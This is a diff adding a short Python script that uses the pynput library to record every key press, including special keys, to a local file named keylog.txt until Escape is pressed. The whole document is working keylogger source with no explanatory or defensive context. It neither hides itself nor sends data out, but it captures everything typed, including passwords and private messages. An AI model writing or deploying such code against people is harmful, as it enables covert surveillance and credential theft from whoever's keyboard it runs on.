@@ -1,0 +1,24 @@
+from pynput import keyboard
+
+def log_key_press(key):
+    try:
+        # Log the key press
+        with open("keylog.txt", "a") as log_file:
+            log_file.write(f"{key.char}")
+    except AttributeError:
+        # Handle special keys (e.g., shift, ctrl, etc.)
+        with open("keylog.txt", "a") as log_file:
+            log_file.write(f"{key}")
+
+def stop_on_escape(key):
+    # Stop the listener when the escape key is pressed
+    if key == keyboard.Key.esc:
+        return False
+
+def main():
+    # Set up the listener
+    with keyboard.Listener(on_press=log_key_press, on_release=stop_on_escape) as key_listener:
+        key_listener.join()
+
+if __name__ == "__main__":
+    main()
